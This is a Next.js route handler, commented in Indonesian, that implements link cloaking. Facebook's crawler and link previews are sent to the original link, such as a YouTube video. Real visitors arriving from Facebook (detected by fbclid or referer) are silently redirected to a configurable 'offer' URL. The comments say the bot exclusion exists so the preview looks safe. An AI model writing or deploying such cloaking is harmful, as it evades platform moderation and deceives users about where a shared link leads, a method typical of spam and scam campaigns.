import { NextResponse } from 'next/server';
import links from '@/data/links.json';
import offerConfig from '@/data/offer.json'; // Import file offer yang baru dibuat

export async function GET(
  request: Request,
  { params }: { params: Promise<{ slug: string }> }
) {
  // 1. Ambil Slug & Data Link Asli
  const { slug } = await params;
  const entry = (links as any[]).find((item) => item.id === slug);

  // Jika link tidak ada di database, lempar ke 404
  if (!entry) {
    const url = new URL(request.url);
    return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
  }

  // ==========================================
  // LOGIC DETEKSI FACEBOOK & OFFER
  // ==========================================
  
  // Ambil URL offer dari file JSON
  const OFFER_URL = offerConfig.url;
  const IS_OFFER_ACTIVE = offerConfig.active;

  // Analisa Pengunjung
  const urlObj = new URL(request.url);
  const searchParams = urlObj.searchParams;
  const referer = request.headers.get('referer') || "";
  const userAgent = request.headers.get('user-agent') || "";

  // Cek Ciri-ciri User Facebook (Bukan Bot)
  const hasFbclid = searchParams.has('fbclid');
  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
  const isFbBot = userAgent.includes('facebookexternalhit') || userAgent.includes('Facebot');

  // Syarat Redirect ke Offer:
  // 1. Fitur offer di JSON "active": true
  // 2. Ada ciri-ciri Facebook (fbclid atau referer)
  // 3. BUKAN Bot (Penting supaya preview link aman)
  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isFbBot) {
    return NextResponse.redirect(OFFER_URL, { status: 302 });
  }

  // ==========================================
  
  // Kalau bukan target offer, masuk ke Link Asli (Youtube, dll)
  // Status 307 penting agar browser cek ulang setiap saat (jangan dicache permanen)
  return NextResponse.redirect(entry.url, { status: 307 });
      }
